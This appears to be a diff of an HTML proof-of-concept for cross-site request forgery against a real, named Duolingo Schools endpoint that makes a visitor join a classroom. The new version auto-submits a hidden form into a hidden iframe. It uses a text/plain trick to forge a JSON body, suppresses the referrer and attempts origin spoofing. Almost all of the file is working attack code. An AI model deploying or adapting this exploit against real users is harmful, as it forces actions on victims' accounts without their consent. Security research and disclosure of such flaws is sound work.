@@ -1,32 +1,30 @@
 <html>
   <body>
     <h1>CSRF PoC - Join Classroom</h1>
-    <script>
-      // Target endpoint
-      const url = 'https://schools.duolingo.com/api/1/observers/join_classroom_by_code';
-      
-      // Malicious payload (classroom code)
-      const payload = {
-        link_code: "dvvscc"
-      };
+    <iframe id="hiddenFrame" name="hiddenFrame" style="display:none"></iframe>
+    
+    <form id="csrfForm" 
+          action="https://schools.duolingo.com/api/1/observers/join_classroom_by_code" 
+          method="POST" 
+          target="hiddenFrame"
+          enctype="text/plain">
+      <input type="hidden" name='{"link_code":"dvvscc","' value='dummy"}'>
+    </form>
 
-      // Send POST request
-      fetch(url, {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json; charset=UTF-8',
-        },
-        body: JSON.stringify(payload),
-        credentials: 'include' // Include cookies
-      })
-      .then(response => {
-        if (response.ok) {
-          console.log('CSRF attack successful!');
-        } else {
-          console.error('CSRF attack failed');
-        }
-      })
-      .catch(error => console.error('Error:', error));
+    <script>
+      // Spoof critical headers using meta tags
+      const meta = document.createElement('meta');
+      meta.name = "referrer";
+      meta.content = "no-referrer";
+      document.head.appendChild(meta);
+
+      // Add Origin-spoofing exception (only works in some browsers)
+      try {
+        window.history.replaceState({}, '', 'https://www.duolingo.com/');
+      } catch(e) {}
+
+      // Submit form automatically
+      document.getElementById('csrfForm').submit();
     </script>
   </body>
 </html>
